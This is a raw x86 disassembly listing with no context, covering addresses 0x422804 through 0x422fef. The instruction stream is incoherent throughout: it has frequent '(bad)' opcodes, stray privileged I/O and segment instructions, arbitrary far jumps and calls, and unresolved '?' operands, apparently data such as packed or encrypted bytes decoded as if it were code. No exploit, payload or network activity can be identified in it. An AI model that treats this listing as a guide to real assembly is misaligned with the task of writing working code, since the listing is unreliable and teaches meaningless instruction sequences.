  422804:	sbb    al,0xf2
  422806:	pop    edx
  422807:	cwde   
  422808:	pop    ecx
  422809:	pop    ebx
  42280a:	sub    ch,BYTE PTR [edx+0x2a03ffb0]
  422810:	inc    edi
  422811:	imul   ebp,DWORD PTR [edx],0xd
  422814:	xchg   BYTE PTR [edx-0x2e],ah
  422817:	push   esi
  422818:	pop    ds
  422819:	retf   
  42281a:	cmp    edx,esi
  42281c:	lea    esi,[edi-0x59]
  42281f:	dec    esp
  422820:	test   DWORD PTR [eax+0x4c0851b7],esi
  422826:	adc    BYTE PTR [esp+ebp*1+0x50],bl
  42282a:	dec    ecx
  42282b:	sub    DWORD PTR [ebx],edi
  42282d:	xchg   esp,eax
  42282e:	in     al,0x94
  422830:	mov    esp,0x8efcbaaa
  422835:	pop    esp
  422836:	popf   
  422837:	mov    ds:0xeacb5a86,al
  42283c:	call   0x1b80:0x9f68ca8b
  422843:	dec    ebp
  422844:	out    0xb8,eax
  422846:	pop    es
  422847:	push   ebx
  422848:	daa    
  422849:	mov    dl,0xef
  42284b:	push   ecx
  42284c:	mov    dh,0x80
  42284e:	adc    dl,cl
  422850:	dec    edi
  422851:	aam    0x28
  422853:	mov    bh,0xff
  422855:	push   0xffffffa4
  422857:	pop    ecx
  422858:	mov    ?,esp
  42285a:	dec    edi
  42285b:	not    BYTE PTR [ebx-0x18f662b2]
  422861:	jmp    0x63518c29
  422866:	pop    ecx
  422867:	push   eax
  422868:	jnp    0x422870
  42286a:	xor    eax,0x5f495aa2
  42286f:	(bad)  [ecx]
  422871:	push   ds
  422872:	sub    cl,ch
  422874:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422875:	ror    DWORD PTR [edx-0x4b998e88],1
  42287b:	popa   
  42287c:	imul   ebp,DWORD PTR [ecx+0x40],0x2cacca0e
  422883:	mov    esi,0x387b6fc
  422888:	(bad)  
  422889:	cli    
  42288a:	outs   dx,BYTE PTR ds:[esi]
  42288b:	clc    
  42288c:	repnz push ebx
  42288e:	adc    al,BYTE PTR [edx+0x6af3a72d]
  422894:	jl     0x422845
  422896:	dec    ebx
  422897:	xchg   ebx,eax
  422898:	mov    ds:0xdd94ddb,al
  42289d:	cli    
  42289e:	stos   DWORD PTR es:[edi],eax
  42289f:	js     0x42291a
  4228a1:	imul   BYTE PTR [ecx+edx*4]
  4228a4:	or     ch,BYTE PTR [edi+0x130881cf]
  4228aa:	push   ebp
  4228ab:	out    0x68,al
  4228ad:	sbb    eax,0x8f721ade
  4228b2:	jns    0x422857
  4228b4:	or     eax,0x447c4c86
  4228b9:	fwait
  4228ba:	or     ecx,DWORD PTR [eax-0x3d]
  4228bd:	jae    0x42293d
  4228bf:	mov    eax,ds:0xafc6eb49
  4228c4:	pusha  
  4228c5:	test   BYTE PTR [eax],dh
  4228c7:	mov    dh,0xd4
  4228c9:	test   eax,0x91ea14df
  4228ce:	gs cdq 
  4228d0:	stc    
  4228d1:	mov    bl,0x24
  4228d3:	fwait
  4228d4:	loop   0x422896
  4228d6:	int3   
  4228d7:	mov    dl,0x8f
  4228d9:	xor    al,0x65
  4228db:	int3   
	...
  422924:	add    BYTE PTR [eax],al
  422926:	sbb    DWORD PTR [edi+ecx*8-0x1],esi
  42292a:	out    dx,eax
  42292b:	(bad)  
  42292c:	cmp    esi,esi
  42292e:	repnz sahf 
  422930:	mov    ebx,0xf969a23
  422935:	mov    al,0x25
  422937:	sbb    al,BYTE PTR [ecx]
  422939:	add    BYTE PTR [esi],bl
  42293b:	pop    es
  42293c:	add    BYTE PTR [eax],al
  42293e:	mov    al,ds:0x7340c4e0
  422943:	add    al,0xed
  422945:	sar    BYTE PTR [edx],0x18
  422948:	shl    DWORD PTR [edx-0x4642ba0c],cl
  42294e:	fisttp WORD PTR [edi-0x16c9dd88]
  422954:	jl     0x422972
  422956:	cmovg  si,WORD PTR [edx]
  42295a:	add    DWORD PTR [edi],0x71
  42295d:	mov    esi,0x8c099e9
  422962:	mov    ecx,0x8c27b873
  422967:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422968:	test   eax,0xb326a973
  42296d:	in     al,dx
  42296e:	outs   dx,BYTE PTR ds:[esi]
  42296f:	(bad)  
  422970:	out    0x3c,eax
  422972:	inc    BYTE PTR [ecx]
  422974:	sbb    DWORD PTR [eax],esi
  422976:	inc    ebp
  422977:	pushf  
  422978:	ins    BYTE PTR es:[edi],dx
  422979:	xor    eax,0xe345f7f2
  42297e:	outs   dx,BYTE PTR ds:[esi]
  42297f:	out    dx,eax
  422980:	xchg   ebx,eax
  422981:	mov    dl,0x4
  422983:	pop    ds
  422984:	clc    
  422985:	sbb    cl,BYTE PTR [ebp+0x5154ff20]
  42298b:	xor    DWORD PTR [edi-0x1a],esi
  42298e:	xchg   esi,eax
  42298f:	ja     0x42295f
  422991:	ret    
  422992:	jne    0x42293a
  422994:	enter  0xaa33,0x59
  422998:	xlat   BYTE PTR ds:[ebx]
  422999:	ds or  eax,0xb75fc07e
  42299f:	mov    DWORD PTR [eax],eax
  4229a1:	adc    eax,0x5ec0967f
  4229a6:	data16 mov cl,bh
  4229a9:	test   al,0xd2
  4229ab:	inc    eax
  4229ac:	adc    DWORD PTR [ebx],ecx
  4229ae:	sub    dh,BYTE PTR [ebx-0x18d016ad]
  4229b4:	pusha  
  4229b5:	arpl   WORD PTR [ebx-0xfcdef6d],bx
  4229bb:	fucomi st,st(5)
  4229bd:	lods   al,BYTE PTR ds:[esi]
  4229be:	xchg   DWORD PTR [edi],ebx
  4229c0:	and    BYTE PTR [edi-0x78dc40ba],dh
  4229c6:	mov    BYTE PTR [edx],bl
  4229c8:	pop    eax
  4229c9:	fdiv   st,st(6)
  4229cb:	popa   
  4229cc:	sub    eax,0xf9cc87cd
  4229d1:	rol    BYTE PTR [edi-0x6e],0xeb
  4229d5:	sub    DWORD PTR [edi+esi*8-0x1c950160],0x30
  4229dd:	adc    edx,DWORD PTR [eax+0x76]
  4229e0:	push   eax
  4229e1:	or     esi,DWORD PTR [ebx+0xb18d08e]
  4229e7:	loope  0x422988
  4229e9:	int    0x30
  4229eb:	loope  0x422a5a
  4229ed:	sub    eax,0x469d4892
  4229f2:	push   ebx
  4229f3:	adc    ecx,DWORD PTR [edi-0x44]
  4229f6:	out    0x96,al
  4229f8:	mov    bh,0xe8
  4229fa:	inc    ebp
  4229fb:	jne    0x422a02
  4229fd:	adc    BYTE PTR [ebp-0x59],bh
  422a00:	dec    eax
  422a01:	mov    ch,BYTE PTR [edx+ebp*2+0x439e29e0]
  422a08:	and    al,0xe3
  422a0a:	fldenv [ebx-0x2440c374]
  422a10:	xchg   ebp,eax
  422a11:	pusha  
  422a12:	loop   0x422a21
  422a14:	stc    
  422a15:	cmp    al,0x36
  422a17:	bnd jnp 0x4229ed
  422a1a:	icebp  
  422a1b:	add    esi,DWORD PTR [edx-0x6a]
  422a1e:	pop    eax
  422a1f:	add    al,0x90
  422a21:	aaa    
  422a22:	test   eax,0x11f80357
  422a27:	push   ss
  422a28:	lods   eax,DWORD PTR fs:[esi]
  422a2a:	jbe    0x422a0e
  422a2c:	je     0x4229d5
  422a2e:	ins    BYTE PTR es:[edi],dx
  422a2f:	lea    ebx,[eax]
  422a31:	aad    0x80
  422a33:	sbb    esp,DWORD PTR [ebx+eiz*2+0x7dc219f1]
  422a3a:	mov    bl,cl
  422a3c:	mov    ch,0x4d
  422a3e:	adc    DWORD PTR [edi+0x1a],esi
  422a41:	push   es
  422a42:	xchg   esi,eax
  422a43:	xchg   esp,eax
  422a44:	jle    0x4229e9
  422a46:	pop    ebx
  422a47:	test   al,0x40
  422a49:	adc    al,0x7b
  422a4b:	add    al,0x8
  422a4d:	inc    eax
  422a4e:	and    DWORD PTR [ebp-0x71],edi
  422a51:	mov    esi,0xb13e088e
  422a56:	push   ecx
  422a57:	dec    ecx
  422a58:	nop
  422a59:	mov    ebp,0xebe812e0
  422a5e:	sbb    BYTE PTR [edi+edx*2+0x530974e5],bl
  422a65:	inc    ecx
  422a66:	int3   
  422a67:	fisub  WORD PTR [ebx]
  422a69:	and    al,0x26
  422a6b:	in     eax,0x22
  422a6d:	sbb    bh,BYTE PTR [eax-0x3a]
  422a70:	jecxz  0x422a92
  422a72:	cmp    BYTE PTR ds:0x29909ea6,0xf
  422a79:	xlat   BYTE PTR ds:[ebx]
  422a7a:	outs   dx,BYTE PTR ds:[esi]
  422a7b:	mov    edi,0xdede59ff
  422a80:	mov    eax,0x43678536
  422a85:	ret    0x50a
  422a88:	leave  
  422a89:	mov    ebx,DWORD PTR [ebp+0x5b]
  422a8c:	jp     0x422b09
  422a8e:	aas    
  422a8f:	(bad)  
  422a90:	adc    eax,DWORD PTR [eax+edi*8+0x3aef3f1d]
  422a97:	int    0xbc
  422a99:	mov    dl,0xdf
  422a9b:	cli    
  422a9c:	aas    
  422a9d:	outs   dx,DWORD PTR ds:[esi]
  422a9e:	jnp    0x422ac9
  422aa0:	inc    eax
  422aa1:	jge    0x422acb
  422aa3:	and    BYTE PTR [ecx+0x13],al
  422aa6:	jmp    0x4adc:0xa6fa31b1
  422aad:	jle    0x422a82
  422aaf:	inc    esi
  422ab0:	callw  0xcb87
  422ab4:	test   eax,0x1f2f7fd0
  422ab9:	sbb    DWORD PTR [eax+ebx*8+0x70],ebp
  422abd:	inc    esi
  422abe:	xor    BYTE PTR [esi+0x3e38c2e],0x4
  422ac5:	aas    
  422ac6:	or     BYTE PTR [ebx],dl
  422ac8:	xchg   esi,eax
  422ac9:	mov    edi,0xb6e0aad5
  422ace:	xlat   BYTE PTR ds:[ebx]
  422acf:	push   eax
  422ad0:	lahf   
  422ad1:	push   ebp
  422ad2:	mov    dh,0x54
  422ad4:	inc    eax
  422ad5:	mov    dh,BYTE PTR [edx+0x3fc9794c]
  422adb:	shl    BYTE PTR [ebx+0x6f],0xa6
  422adf:	cmp    ebp,ebx
  422ae1:	(bad)  
  422ae3:	and    esp,DWORD PTR [ecx+edi*8-0x8e7930c]
  422aea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422aeb:	cli    
  422aec:	pushf  
  422aed:	cmc    
  422aee:	test   DWORD PTR [esi+0x34],edx
  422af1:	sub    DWORD PTR [edx],ecx
  422af3:	dec    esp
  422af4:	xor    DWORD PTR [ebx-0xf],0xc3de3d3d
  422afb:	dec    ebp
  422afc:	add    ecx,DWORD PTR [ecx+0x3c002f0c]
  422b02:	aaa    
  422b03:	ins    BYTE PTR es:[edi],dx
  422b04:	fld    TBYTE PTR [edx-0x1d]
  422b07:	jnp    0x422b17
  422b09:	(bad)  
  422b0b:	lods   eax,DWORD PTR ds:[esi]
  422b0c:	mov    al,ds:0x732c3647
  422b11:	loope  0x422b14
  422b13:	mov    dl,0x1
  422b16:	adc    al,0x12
  422b18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b19:	mov    ch,0xd5
  422b1b:	adc    DWORD PTR [edi-0x257e99f0],ebx
  422b21:	cmc    
  422b22:	mov    edi,0xe6e1c5e2
  422b27:	inc    ebx
  422b28:	xor    bl,ah
  422b2a:	ins    DWORD PTR es:[edi],dx
  422b2b:	setg   ch
  422b2e:	fild   QWORD PTR [ebx]
  422b30:	add    DWORD PTR [ebx],edi
  422b32:	jae    0x422b21
  422b34:	jo     0x422b1b
  422b36:	cld    
  422b37:	jo     0x422b55
  422b39:	mov    al,0x3c
  422b3b:	xchg   ecx,eax
  422b3c:	inc    edi
  422b3d:	mov    WORD PTR [esi-0x417e3b6b],?
  422b43:	(bad)  
  422b44:	or     eax,eax
  422b46:	stc    
  422b47:	mov    ch,ah
  422b49:	mov    al,ds:0x6348c057
  422b4e:	inc    BYTE PTR [eax-0x56]
  422b51:	popf   
  422b52:	sub    ah,BYTE PTR [edx-0x67bc100d]
  422b58:	mov    WORD PTR [ecx-0x6f],gs
  422b5b:	or     cl,ch
  422b5d:	rcr    DWORD PTR [edi],cl
  422b5f:	test   BYTE PTR [edi+0x62fe14f3],dl
  422b65:	xor    edx,DWORD PTR [esi]
  422b67:	pop    esp
  422b68:	adc    ah,BYTE PTR [ebx-0xc06b71e]
  422b6e:	cmp    ecx,DWORD PTR [edx]
  422b70:	jae    0x422b67
  422b72:	adc    DWORD PTR [ebp+ebp*8-0x21e45a56],0x8a27c389
  422b7d:	jge    0x422bda
  422b7f:	dec    esi
  422b80:	les    eax,FWORD PTR [ebp-0x52eb19f6]
  422b86:	cdq    
  422b87:	lds    edx,FWORD PTR [eax-0x6a]
  422b8a:	pop    ds
  422b8b:	rcl    BYTE PTR [ecx],cl
  422b8d:	in     eax,0xbb
  422b8f:	popa   
  422b90:	push   es
  422b91:	mov    ds:0xb1df9153,eax
  422b96:	rcr    DWORD PTR [eax+0x57],1
  422b99:	outs   dx,DWORD PTR ds:[esi]
  422b9a:	(bad)  
  422b9b:	sub    al,0x30
  422b9d:	sub    DWORD PTR [eax],ebp
  422b9f:	dec    ecx
  422ba0:	push   esi
  422ba1:	lods   al,BYTE PTR ds:[esi]
  422ba2:	mov    bh,0x94
  422ba4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ba5:	jmp    0x422c20
  422ba7:	fs into 
  422ba9:	mul    ch
  422bab:	sub    cl,ch
  422bad:	sub    cl,BYTE PTR [eax]
  422baf:	(bad)  
  422bb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bb1:	push   0x18e7f244
  422bb6:	mov    BYTE PTR [ebx-0x12],bh
  422bb9:	inc    ebp
  422bba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422bbb:	push   eax
  422bbc:	or     ebp,DWORD PTR [edi-0x53]
  422bbf:	cmp    al,0x3e
  422bc1:	or     al,0xfb
  422bc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bc4:	mov    ecx,0x87856879
  422bc9:	inc    ebp
  422bca:	out    dx,al
  422bcb:	js     0x422c06
  422bcd:	push   cs
  422bce:	cmp    esi,DWORD PTR [edx+0x54]
  422bd1:	xchg   edx,eax
  422bd2:	dec    ecx
  422bd3:	(bad)  
  422bd4:	xlat   BYTE PTR ds:[ebx]
  422bd5:	fidivr DWORD PTR [esi-0x3e]
  422bd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bd9:	adc    DWORD PTR [edi+0x1738117a],ebp
  422bdf:	mul    dl
  422be1:	int3   
  422be2:	push   edi
  422be3:	test   DWORD PTR [eax+0x28],0x3d5a1fee
  422bea:	jnp    0x422c6a
  422bec:	add    edx,DWORD PTR [edx+ebx*8]
  422bef:	and    eax,0x122ae617
  422bf4:	aad    0x5a
  422bf6:	popa   
  422bf7:	push   edx
  422bf8:	call   0xe05fefec
  422bfd:	aad    0xf1
  422bff:	add    eax,0x73037109
  422c04:	adc    bh,bl
  422c06:	cmc    
  422c07:	jns    0x422bff
  422c09:	inc    esp
  422c0a:	inc    eax
  422c0b:	retf   0xc375
  422c0e:	lods   eax,DWORD PTR ds:[esi]
  422c0f:	test   BYTE PTR [eax],dh
  422c11:	leave  
  422c12:	mov    cl,0x75
  422c14:	or     BYTE PTR [ebp+0x4e],dh
  422c17:	cld    
  422c18:	retf   
  422c19:	scas   eax,DWORD PTR es:[edi]
  422c1a:	xchg   esi,eax
  422c1b:	cld    
  422c1c:	(bad)  
  422c1d:	sub    cl,ah
  422c1f:	jecxz  0x422bf5
  422c21:	sub    BYTE PTR [eax+ecx*4+0x58],bh
  422c25:	dec    esi
  422c26:	fimul  DWORD PTR [esi]
  422c28:	push   ss
  422c29:	in     al,dx
  422c2a:	and    BYTE PTR [esi],ch
  422c2c:	jge    0x422bdb
  422c2e:	test   eax,0x61952e72
  422c33:	fdiv   DWORD PTR [ebx]
  422c35:	adc    BYTE PTR [esi-0x261a1850],bh
  422c3b:	out    0xa6,eax
  422c3d:	push   edi
  422c3e:	not    BYTE PTR [ebx-0x567d4819]
  422c44:	aam    0x56
  422c46:	jns    0x422c2b
  422c48:	push   ds
  422c49:	pop    ss
  422c4a:	test   BYTE PTR [eax],0xf1
  422c4d:	cmp    DWORD PTR [esi],0xffffff97
  422c50:	push   cs
  422c51:	ins    BYTE PTR es:[edi],dx
  422c52:	je     0x422c4d
  422c54:	dec    eax
  422c55:	js     0x422c04
  422c57:	or     BYTE PTR [esi-0x26b592a4],dl
  422c5d:	fnop   
  422c5f:	outs   dx,BYTE PTR ds:[esi]
  422c60:	jp     0x422c68
  422c62:	retf   
  422c63:	add    eax,0xb56b3975
  422c68:	sbb    BYTE PTR [ecx-0x4c],0xfd
  422c6c:	in     eax,dx
  422c6d:	lods   eax,DWORD PTR ds:[esi]
  422c6e:	or     eax,0x449295b7
  422c73:	daa    
  422c74:	test   eax,0xbb1d09f7
  422c79:	int3   
  422c7a:	int3   
  422c7b:	xor    ch,dh
  422c7d:	pop    ebx
  422c7e:	lock xor BYTE PTR [edx-0x1c],ch
  422c82:	dec    ebp
  422c83:	xor    bl,cl
  422c85:	fwait
  422c86:	rcr    ah,1
  422c88:	or     al,0x35
  422c8a:	pop    edi
  422c8b:	lods   al,BYTE PTR ds:[esi]
  422c8c:	pop    edi
  422c8d:	mov    edi,0xaebe3dc1
  422c92:	jb     0x422c61
  422c94:	cdq    
  422c95:	loopne 0x422c3d
  422c97:	fld    TBYTE PTR [ecx]
  422c99:	jl     0x422c1f
  422c9b:	cmp    BYTE PTR ss:[edi+ecx*1],bh
  422c9f:	sbb    al,BYTE PTR [ebp-0x2d]
  422ca2:	sahf   
  422ca3:	inc    esp
  422ca4:	clc    
  422ca5:	repnz iret 
  422ca7:	inc    edx
  422ca8:	scas   eax,DWORD PTR es:[edi]
  422ca9:	mov    cs,ecx
  422cab:	add    al,0x1c
  422cad:	fscale 
  422cb0:	push   edi
  422cb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cb2:	(bad)  
  422cb3:	int3   
  422cb4:	jne    0x422c58
  422cb6:	out    dx,eax
  422cb7:	xor    DWORD PTR [edi-0x2e],edi
  422cba:	mov    al,ah
  422cbc:	data16 scas al,BYTE PTR es:[edi]
  422cbe:	clc    
  422cbf:	dec    esp
  422cc0:	mov    esi,0xd3759c24
  422cc5:	int3   
  422cc6:	push   edx
  422cc7:	inc    ecx
  422cc8:	or     ebp,DWORD PTR [eax+0x6067b3a]
  422cce:	mov    edi,ecx
  422cd0:	das    
  422cd1:	push   cs
  422cd2:	inc    esp
  422cd3:	push   edi
  422cd4:	or     eax,0x8bc38497
  422cd9:	or     dl,BYTE PTR [eax]
  422cdb:	loopne 0x422c84
  422cdd:	sub    eax,0x458b0eba
  422ce2:	xchg   edx,eax
  422ce3:	jb     0x422c80
  422ce5:	add    eax,0x68ee17f5
  422cea:	or     BYTE PTR ds:0xf8c8305e,al
  422cf0:	leave  
  422cf1:	imul   ecx,esp,0xbfa35594
  422cf7:	in     al,0x89
  422cf9:	mov    ds:0x154887fa,eax
  422cfe:	jmp    0xf501:0x23ab173e
  422d05:	gs dec eax
  422d07:	add    esp,DWORD PTR [esi]
  422d09:	jecxz  0x422cc4
  422d0b:	fnstenv [edx]
  422d0d:	adc    eax,0x9e465ec4
  422d12:	jbe    0x422d49
  422d14:	data16 lods al,BYTE PTR ds:[esi]
  422d16:	enter  0x1866,0x4
  422d1a:	fdiv   DWORD PTR [edx-0x2673f9ad]
  422d20:	inc    esi
  422d21:	lds    ecx,FWORD PTR [ebp-0x5bc95b0e]
  422d27:	gs into 
  422d29:	or     cl,BYTE PTR [ecx+0x22]
  422d2c:	or     eax,0x445d0cc3
  422d31:	sub    BYTE PTR [esi+0x6c768720],al
  422d37:	mov    cs,WORD PTR [edi-0x2f]
  422d3a:	cmp    eax,0x902e86a5
  422d3f:	xchg   esi,eax
  422d40:	imul   edx,edi,0x641bd9e6
  422d46:	icebp  
  422d47:	mov    al,BYTE PTR [edx-0x70]
  422d4a:	(bad)  
  422d4b:	sti    
  422d4c:	les    ebx,FWORD PTR [edx]
  422d4e:	loop   0x422cd9
  422d50:	mov    bh,BYTE PTR [eax+ecx*4+0x63]
  422d54:	imul   ebp,DWORD PTR [ebx-0x297288ee],0xa9be6dd6
  422d5e:	lods   eax,DWORD PTR ds:[esi]
  422d5f:	test   DWORD PTR [eax+eiz*8-0x71880d6d],ecx
  422d66:	in     al,dx
  422d67:	scas   eax,DWORD PTR es:[edi]
  422d68:	mov    eax,ds:0x1de8e810
  422d6d:	mov    ebp,0xab339f31
  422d72:	inc    esi
  422d73:	sbb    BYTE PTR [edi+eax*8-0x58],ch
  422d77:	rcr    DWORD PTR [ebx-0x6b],1
  422d7a:	and    al,0x60
  422d7c:	adc    al,0x4
  422d7e:	add    eax,0xbe55989c
  422d83:	jmp    DWORD PTR ds:0x6f322eee
  422d89:	cwde   
  422d8a:	test   al,0xab
  422d8c:	fwait
  422d8d:	sub    al,BYTE PTR [eax-0x1c]
  422d90:	jmp    0x2148:0x5aa7c19f
  422d97:	popa   
  422d98:	xor    al,0x2a
  422d9a:	(bad)  
  422d9c:	jo     0x422e1d
  422d9e:	test   eax,0xef37f383
  422da3:	sbb    DWORD PTR [ecx],esp
  422da5:	fiadd  DWORD PTR [esi+0x3e]
  422da8:	mov    ch,0x21
  422daa:	js     0x422d99
  422dac:	mov    ebx,0x1fe359e4
  422db1:	jno    0x422d91
  422db3:	jp     0x422d8f
  422db5:	mov    cl,0x3a
  422db7:	cmp    dl,BYTE PTR [edx]
  422db9:	push   esi
  422dba:	or     al,0x5
  422dbc:	cli    
  422dbd:	shl    DWORD PTR [eax-0x2b],0xdd
  422dc1:	push   edx
  422dc2:	test   DWORD PTR [ecx+ebx*4-0x7f95c194],0x9ec7fd02
  422dcd:	outs   dx,DWORD PTR ds:[esi]
  422dce:	sbb    edx,edi
  422dd0:	aam    0xd7
  422dd2:	in     al,0x7d
  422dd4:	js     0x422de6
  422dd6:	iret   
  422dd7:	push   edx
  422dd8:	and    ah,dl
  422dda:	add    eax,ebp
  422ddc:	lods   al,BYTE PTR ds:[esi]
  422ddd:	in     al,0xc
  422ddf:	push   eax
  422de0:	or     DWORD PTR [esi+ebx*1+0x5a4798db],esp
  422de7:	push   ebx
  422de8:	adc    BYTE PTR [edx],bh
  422dea:	xor    al,0xdf
  422dec:	mov    ah,0x92
  422dee:	sbb    ch,BYTE PTR [eax+0x60]
  422df1:	(bad)  
  422df2:	std    
  422df3:	xor    eax,0x7aa9df66
  422df8:	retf   
  422df9:	jle    0x422de7
  422dfb:	mov    ah,0x8f
  422dfd:	ror    DWORD PTR [edi],cl
  422dff:	jmp    0xf10:0x38c9f370
  422e06:	sub    dh,bh
  422e08:	dec    eax
  422e09:	mov    edx,0x490c9742
  422e0e:	iret   
  422e0f:	push   ds
  422e10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e11:	cmp    ebx,0x13
  422e14:	jmp    0x92d4:0x67c6b2e6
  422e1b:	popf   
  422e1c:	adc    eax,0x5b63aa2d
  422e21:	cmp    esp,DWORD PTR [ebx+0xfeeb984]
  422e27:	inc    ebp
  422e28:	dec    esp
  422e29:	popf   
  422e2a:	dec    eax
  422e2b:	add    ah,BYTE PTR [edx]
  422e2d:	out    0x4b,eax
  422e2f:	fmul   QWORD PTR [ecx+0x64]
  422e32:	jge    0x422e64
  422e34:	or     al,0x32
  422e36:	sub    eax,DWORD PTR [edx+edi*4+0x6a]
  422e3a:	out    dx,al
  422e3b:	mov    ch,0x67
  422e3d:	dec    edi
  422e3e:	mov    eax,DWORD PTR [eax]
  422e40:	dec    eax
  422e41:	cmp    esp,esi
  422e43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e44:	sbb    edi,eax
  422e46:	ins    DWORD PTR es:[edi],dx
  422e47:	shl    BYTE PTR ds:0x70b1d09d,0x3
  422e4e:	push   edx
  422e4f:	dec    edx
  422e50:	jl     0x422e48
  422e52:	test   BYTE PTR [ebp+eiz*1+0x6b],ch
  422e56:	in     al,0x4b
  422e58:	and    DWORD PTR [edi],ebp
  422e5a:	or     al,0xdd
  422e5c:	or     eax,0xda701062
  422e61:	ins    BYTE PTR es:[edi],dx
  422e62:	idiv   esp
  422e64:	sub    eax,0x548739f0
  422e69:	dec    esi
  422e6a:	enter  0xf565,0x90
  422e6e:	aam    0xee
  422e70:	mov    bl,0x72
  422e72:	mov    bh,0xba
  422e74:	or     eax,0x1e70cfaf
  422e79:	call   0xe6f4:0xbb687f4b
  422e80:	jno    0x422eb7
  422e82:	sahf   
  422e83:	push   esp
  422e84:	sbb    al,BYTE PTR ds:0xcd8b7439
  422e8a:	scas   al,BYTE PTR es:[edi]
  422e8b:	iret   
  422e8c:	mov    ?,WORD PTR [ecx-0x75ff606b]
  422e92:	cs inc eax
  422e94:	xor    dl,BYTE PTR [ecx]
  422e96:	or     DWORD PTR [edx-0x5a09f6cb],ecx
  422e9c:	cmp    BYTE PTR ds:[edx+ecx*8],dh
  422ea0:	stc    
  422ea1:	mov    esp,0xfe53304d
  422ea6:	xor    eax,esp
  422ea8:	int3   
  422ea9:	sbb    BYTE PTR [ecx+eiz*2+0x21],dh
  422ead:	imul   BYTE PTR [edi]
  422eaf:	mov    BYTE PTR [ebx+0x7a],ah
  422eb2:	dec    ebx
  422eb3:	xor    ebp,0xffffffb3
  422eb6:	dec    esi
  422eb7:	jbe    0x422e7b
  422eb9:	push   0xaf9bac3e
  422ebe:	sub    eax,0x9f9d3195
  422ec3:	xor    edx,esp
  422ec5:	mov    dl,0x9a
  422ec7:	out    dx,eax
  422ec8:	xor    eax,0x8fee73d3
  422ecd:	fcomi  st,st(1)
  422ecf:	add    eax,0xf968192b
  422ed4:	jbe    0x422ee7
  422ed6:	fstp   DWORD PTR [esi-0x55d8bbcd]
  422edc:	xor    DWORD PTR [esi+0x5ed96666],ecx
  422ee2:	adc    al,0xa8
  422ee4:	xor    al,cl
  422ee6:	int    0xb1
  422ee8:	xchg   esp,eax
  422ee9:	fist   WORD PTR [edi+0x2633cd6c]
  422eef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ef0:	add    eax,DWORD PTR [esp+edi*1-0x3b]
  422ef4:	adc    eax,0x72113955
  422ef9:	or     al,0xee
  422efb:	sbb    eax,0x7ffc2855
  422f00:	lds    ebx,FWORD PTR [edi]
  422f02:	mov    bh,0xc7
  422f04:	imul   ebp,DWORD PTR ds:0x18f44327,0x25
  422f0b:	pop    eax
  422f0c:	out    dx,eax
  422f0d:	xchg   ebp,eax
  422f0e:	cmp    DWORD PTR [edx],esi
  422f10:	push   cs
  422f11:	dec    ecx
  422f12:	(bad)  
  422f13:	shr    eax,cl
  422f15:	push   edi
  422f16:	push   0x13ca0aed
  422f1b:	out    dx,eax
  422f1c:	mov    al,ds:0x34a0c592
  422f21:	mov    ds:0x676888bb,al
  422f26:	sbb    DWORD PTR ds:0x468b6aee,ebx
  422f2c:	or     ebp,DWORD PTR [esi*2+0x1c0ebcf6]
  422f33:	or     BYTE PTR [esi-0x37],bh
  422f36:	jle    0x422ec0
  422f38:	push   ds
  422f39:	cmp    cl,BYTE PTR [ebx+0x7f03b64f]
  422f3f:	mov    eax,DWORD PTR [edi]
  422f41:	mov    WORD PTR [ebx-0x1219e83b],ss
  422f47:	jno    0x422ecc
  422f49:	aam    0x7a
  422f4b:	sub    DWORD PTR [ecx+0x14ea82cd],0xffffffa4
  422f52:	imul   edi,DWORD PTR [ebp-0x178c68f1],0x91c7483
  422f5c:	leave  
  422f5d:	xchg   ebx,eax
  422f5e:	xor    DWORD PTR ss:[eax-0x56],esp
  422f62:	call   0x923e:0x17b74dc4
  422f69:	(bad)  
  422f6a:	aas    
  422f6b:	into   
  422f6c:	inc    esi
  422f6d:	int3   
  422f6e:	sahf   
  422f6f:	sqrtps xmm6,XMMWORD PTR [ecx-0x63a31f09]
  422f76:	cwde   
  422f77:	stos   BYTE PTR es:[edi],al
  422f78:	out    0x17,ax
  422f7b:	xor    DWORD PTR [ebx-0x7d],edx
  422f7e:	sbb    DWORD PTR [esi+0x738818f7],esp
  422f84:	imul   edi,DWORD PTR [edx],0xfffffff7
  422f87:	pop    ebx
  422f88:	xchg   ebp,eax
  422f89:	pop    ss
  422f8a:	cli    
  422f8b:	xor    al,0x73
  422f8d:	jns    0x422fed
  422f8f:	jmp    0x6ac1:0x3f35488a
  422f96:	or     BYTE PTR [ebx-0x22],0x80
  422f9a:	pop    eax
  422f9b:	jae    0x422f7f
  422f9d:	sub    DWORD PTR [edi],0x61
  422fa0:	and    DWORD PTR [ebp-0x39],ebx
  422fa3:	or     edx,DWORD PTR gs:[ecx-0x27]
  422fa7:	inc    edx
  422fa8:	mov    eax,ds:0x48019180
  422fad:	jmp    0x219537d2
  422fb2:	(bad)
  422fb5:	in     al,dx
  422fb6:	jb     0x422f7e
  422fb8:	xchg   esp,eax
  422fb9:	or     DWORD PTR [ebp+0x20],edi
  422fbc:	adc    DWORD PTR [ebp-0x4f],edi
  422fbf:	stc    
  422fc0:	mov    dh,BYTE PTR [eax]
  422fc2:	sbb    BYTE PTR [eax],0x9b
  422fc5:	mov    al,ds:0x3f0b348f
  422fca:	or     edi,DWORD PTR [ecx+0x3a]
  422fcd:	cmp    BYTE PTR [ecx-0x21],ah
  422fd0:	or     BYTE PTR [eax-0x75130f4d],0xcc
  422fd7:	shl    BYTE PTR [ebp-0x26],0xa9
  422fdb:	aaa    
  422fdc:	aas    
  422fdd:	jbe    0x422fb8
  422fdf:	scas   eax,DWORD PTR es:[edi]
  422fe0:	push   0x9a122ac8
  422fe5:	(bad)  
  422fe6:	mov    esp,0xdece291d
  422feb:	imul   eax,DWORD PTR [edx+0x4a],0x52
  422fef:	sub    edx,edx
